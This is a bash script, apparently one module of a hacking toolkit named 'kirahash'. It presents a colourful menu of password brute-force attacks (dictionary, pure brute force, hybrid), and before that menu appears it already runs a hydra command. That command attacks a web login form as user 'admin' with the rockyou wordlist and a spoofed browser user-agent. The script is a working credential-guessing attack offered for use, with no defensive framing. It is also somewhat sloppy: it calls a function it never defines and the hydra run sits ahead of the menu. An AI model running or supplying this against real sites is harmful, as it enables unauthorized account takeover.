#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
TARGET="http://target.com/login"

log_activity "Brute Force Attempt" "Target: $TARGET, User-Agent: $UA" ""

hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -s 80 -U "$UA"

clear
toilet -f pagga "Brute Force" | lolcat
echo -e "\e[1;36m🔥 Welcome to the Brute Force Attack Module\e[0m"
echo ""
echo -e "\e[1;33mChoose the attack type:\e[0m"

echo -e "\e[1;32m1) Dictionary Attack\e[0m"
echo -e "   🔍 Try passwords from a wordlist to find a match (fastest if the password is weak or common)"
echo ""

echo -e "\e[1;32m2) Pure Brute Force Attack\e[0m"
echo -e "   💣 Tries every possible character combination — powerful but slow"
echo ""

echo -e "\e[1;32m3) Hybrid Attack\e[0m"
echo -e "   🧬 Perform Brute force Attark "
echo ""

echo -e "\e[1;31m0) Back to Main Menu\e[0m"
echo ""

read -p $'\e[1;34mSelect an option: \e[0m' choice

case $choice in
    1)
        bash "$SCRIPT_DIR/bruteforce/dictionary.sh"
        ;;
    2)
        bash "$SCRIPT_DIR/bruteforce/pure.sh"
        ;;
    3)
        bash "$SCRIPT_DIR/bruteforce/hybrid.sh"
        ;;
    0)
        kirahash
        ;;
    *)
        echo -e "\n\e[1;31mInvalid choice. Please try again.\e[0m"
        sleep 2
        bash modules/brute_force.sh
        ;;
esac
